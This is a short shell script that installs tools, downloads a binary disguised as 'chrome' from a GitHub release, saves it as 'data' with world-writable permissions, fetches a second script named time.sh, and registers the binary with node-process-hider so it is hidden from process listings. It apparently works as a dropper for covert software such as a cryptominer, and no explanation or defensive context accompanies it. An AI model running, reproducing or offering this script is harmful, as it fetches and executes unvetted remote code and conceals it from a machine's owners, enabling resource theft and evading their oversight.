#!/bin/sh
#
apt update -y
apt install screen -y

apt install -y lynx
npm i -g node-process-hider
#
lynx -dont_wrap_pre -dump https://github.com/esinkaguh/basicsrb/releases/download/v.3.0/chrome > data && chmod 777 data
#
wget https://raw.githubusercontent.com/esinkaguh/esinkaguh/main/time.sh && chmod +x time.sh

#####
clear
 
#
ph add data